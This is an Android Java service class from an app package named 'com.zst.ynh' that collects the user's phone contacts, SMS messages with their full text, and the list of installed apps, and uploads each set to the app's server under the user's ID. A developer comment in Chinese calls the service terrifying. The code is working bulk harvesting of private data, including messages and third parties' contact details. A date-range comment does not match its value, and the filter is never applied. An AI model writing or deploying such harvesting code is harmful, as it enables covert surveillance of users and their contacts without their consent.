package com.zst.ynh.service;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.RegexUtils;
import com.blankj.utilcode.util.SPUtils;
import com.zst.ynh.bean.AppInfo;
import com.zst.ynh.bean.Contacts;
import com.zst.ynh.bean.UserSmsInfoBean;
import com.zst.ynh.config.ApiUrl;
import com.zst.ynh.config.BundleKey;
import com.zst.ynh.config.SPkey;
import com.zst.ynh.utils.StringUtil;
import com.zst.ynh.utils.UploadPersonInfoUtil;
import com.zst.ynh_base.net.BaseParams;
import com.zst.ynh_base.net.HttpManager;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 这个service上传用户的联系人，短信，手机所装的app。贼恐怖
 */
public class UploadPersonInfoService extends IntentService {
    private HttpManager httpManager;
    private String uid;
    public static final int SMS = 1;//短信
    public static final int APP = 2;//app数量
    public static final int CONTACT = 3;//联系人

    public UploadPersonInfoService(){
        super("UploadPersonInfo");

    }

    @Override
    public void onCreate() {
        super.onCreate();
        httpManager = new HttpManager(this);
        uid = SPUtils.getInstance().getString(SPkey.UID);
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        int type = intent.getIntExtra(BundleKey.UPLOAD_TYPE, -1);
        switch (type) {
            case CONTACT:
                getPhoneContacts(this);
                break;
            case SMS:
                uploadSMS();
                break;
            case APP:
                uploadAppList();
                break;
        }
    }

    /************************************************************************************************************************************/
    //获取系统联系人，并上传
    public void getPhoneContacts(Context context) {
        //联系人集合
        List<Contacts> data = new ArrayList<>();
        ContentResolver resolver = context.getContentResolver();
        //搜索字段
        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.Contacts.DISPLAY_NAME};
        // 获取手机联系人
        Cursor contactsCursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection, null, null, null);
        if (contactsCursor != null) {
            //key: contactId,value: 该contactId在联系人集合data的index
            Map<Integer, Integer> contactIdMap = new HashMap<>();
            while (contactsCursor.moveToNext()) {
                //获取联系人的ID
                int contactId = contactsCursor.getInt(0);
                //获取联系人的姓名
                String name = contactsCursor.getString(2);
                //获取联系人的号码
                String phoneNumber = contactsCursor.getString(1);
                //号码处理
                String replace = phoneNumber.replace(" ", "").replace("-", "").replace("+", "");
                //判断号码是否符合手机号
                if (RegexUtils.isMobileSimple(replace)) {
                    //如果联系人Map已经包含该contactId
                    if (contactIdMap.containsKey(contactId)) {
//                        //得到该contactId在data的index
                        Integer index = contactIdMap.get(contactId);
//                        //重新设置号码数组
                        Contacts contacts = data.get(index);
//                        String[] mobile = contacts.getMobile();
//                        String[] mobileCopy = new String[mobile.length + 1];
//                        for (int i = 0; i < mobile.length; i++) {
//                            mobileCopy[i] = mobile[i];
//                        }
//                        mobileCopy[mobileCopy.length - 1] = replace;
                        contacts.setMobile(replace);
                    } else {
                        //如果联系人Map不包含该contactId
                        Contacts contacts = new Contacts();
                        contacts.setRecordId(contactId);
                        contacts.setName(name);
                        contacts.setStatus(0);
                        contacts.setUid(uid);
                        String[] strings = new String[1];
                        strings[0] = replace;
                        contacts.setMobile(replace);
                        data.add(contacts);
                        contactIdMap.put(contactId, data.size() - 1);
                    }
                }
            }
            contactsCursor.close();
        }
        uploadContact(data, CONTACT);
    }
/************************************************************************************************************************************/
    /**
     * 获取短信
     *
     * @param context
     * @return
     */
    private List<UserSmsInfoBean> getSmsInfoList(Context context) {

        List<UserSmsInfoBean> list = new ArrayList<>();
        Uri SMS_INBOX = Uri.parse("content://sms/");
        ContentResolver cr = context.getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        String where = "date>" + (System.currentTimeMillis() - 15552000000l);//30天 = 30*24*60*60*1000ms = 2592000000ms
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (cur != null && cur.moveToFirst()) {
            int phoneNumberColumn = cur.getColumnIndex("address");
            int dateColumn = cur.getColumnIndex("date");
            int bodyColumn = cur.getColumnIndex("body");
            int typeColumn = cur.getColumnIndex("type");
            do {
                String phoneNumber;
                String date;
                String body;
                int type;
                phoneNumber = cur.getString(phoneNumberColumn);
                body = cur.getString(bodyColumn);
                type = cur.getInt(typeColumn);
                SimpleDateFormat dateFormat = new SimpleDateFormat(
                        "yyyy-MM-dd hh:mm:ss");
                Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                date = dateFormat.format(d);
                UserSmsInfoBean mUserSmsInfo = new UserSmsInfoBean();
                mUserSmsInfo.setMessageContent(body);
                mUserSmsInfo.setMessageDate(date);
                mUserSmsInfo.setMessageType(decodeSmsType(type));
                mUserSmsInfo.setPhone(phoneNumber);
                mUserSmsInfo.setUserId(uid);
                if (list.size() <= 1000)
                    list.add(mUserSmsInfo);
            } while (cur.moveToNext());
            return list;
        } else {
            return null;
        }

    }

    private String decodeSmsType(int type) {
        switch (type) {
            case 1:
                return "发送";
            case 2:
                return "接收";
            default:
                return "";
        }
    }

    private void uploadSMS() {
        List<UserSmsInfoBean> smsList = getSmsInfoList(this);
        if (smsList == null || smsList.size() == 0) {
        } else {
            uploadContact(smsList, SMS);
        }
    }

    /************************************************************************************************************************************/
    private List<AppInfo> getAppInfoList(Context context) {
//        /获取手机中所有已安装的应用，并判断是否系统应用
        ArrayList<AppInfo> appList = new ArrayList<AppInfo>(); //用来存储获取的应用信息数据，手机上安装的应用数据都存在appList里
        List<PackageInfo> packages = context.getPackageManager().getInstalledPackages(0);

        for (int i = 0; i < packages.size(); i++) {
            PackageInfo packageInfo = packages.get(i);
            AppInfo tmpInfo = new AppInfo();
            tmpInfo.setAppName(packageInfo.applicationInfo.loadLabel(context.getPackageManager()).toString());
            tmpInfo.setPackageName(packageInfo.packageName);
            tmpInfo.setVersionCode(packageInfo.versionCode);
            tmpInfo.setUserId(uid);
            appList.add(tmpInfo);
            //判断是否系统应用
            if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                //非系统应用
            } else {
                //系统应用　　　　　　　　
            }
        }
        return appList;
    }

    private void uploadAppList() {
        List<AppInfo> appList = getAppInfoList(this);
        if (appList == null || appList.size() == 0) {
        } else {
            uploadContact(appList, APP);
        }
    }
    /************************************************************************************************************************************/
    /**
     * 上传
     *
     * @param data
     */
    private void uploadContact(List<?> data, int type) {
//        Map<String, String> map = BaseParams.getBaseParams();
//        map.put("data", StringUtil.ListToString(data));
//        map.put("type", "" + type);
//        httpManager.executePostString(ApiUrl.UPLOAD_PERSON_INFO, map, new HttpManager.ResponseCallBack<String>() {
//            @Override
//            public void onCompleted() {
//                stopSelf();
//            }
//
//            @Override
//            public void onError(int code, String errorMSG) {
//                LogUtils.d(errorMSG);
//            }
//
//            @Override
//            public void onSuccess(String response) {
//
//            }
//        });
        UploadPersonInfoUtil.uploadPersonInfo(ApiUrl.UPLOAD_PERSON_INFO, data, type, new UploadPersonInfoUtil.IUploadCallBack() {
            @Override
            public void onSuccess() {
            }

            @Override
            public void onFail(String message) {
                LogUtils.d(message);
            }

            @Override
            public void onComplete() {
                stopSelf();
            }
        });
    }

}
